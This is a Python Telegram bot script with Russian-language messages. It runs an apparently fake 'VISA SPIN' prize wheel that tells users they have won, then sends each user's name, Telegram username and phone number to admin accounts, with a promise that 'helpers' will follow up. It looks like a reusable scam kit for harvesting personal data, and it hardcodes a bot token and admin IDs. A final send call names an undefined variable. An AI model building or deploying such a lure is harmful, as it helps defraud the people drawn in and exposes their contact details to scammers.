import asyncio
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8245369116:AAF3X7Un9qlwJkV1aqdX9pMXquuGiIWacq4"
ADMIN_IDS = [5343947280, 453635804, 939363398]

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(CommandStart())
async def start(message: types.Message):
    # Замени URL на ссылку своего сайта, куда зальешь код выше
    web_app_url = "https://glorious-umbrella-pjjxj56r4rw6c76q9-8080.app.github.dev/"
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎰 ГАЗОВАТЬ В VISA SPIN", web_app=WebAppInfo(url=web_app_url))]
    ])
    
    await message.answer(
        "**VISA SPIN — Мой подгон тебе за музло!**\n\n"
        "У тебя есть попытки, чтобы выбить жир.\n"
        "Жми кнопку и погнали! 👇",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(F.web_app_data)
async def web_app_handler(message: types.Message):
    # Получаем данные из формы сайта
    data = json.loads(message.web_app_data.data)
    
    text_user = (
        f"✅ Принято, {data['name']}!\n"
        f"Твой выигрыш: **{data['prize']}**\n\n"
        "Мои хэлперы уже чекают инфу. Напишем в течение 15 минут!"
    )
    await message.answer(text_user, parse_mode="Markdown")

    # Отправка тебе в личку (админу)
    text_admin = (
        f"🔥 **НОВАЯ ЗАЯВКА VISA SPIN**\n"
        f"🎁 Приз: {data['prize']}\n"
        f"👤 Имя: {data['name']}\n"
        f"📱 Ник: @{data['user'].replace('@', '')}\n"
        f"📞 Тел: {data['phone']}"
    )
    await bot.send_message(ADMIN_ID, text_admin, parse_mode="Markdown")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
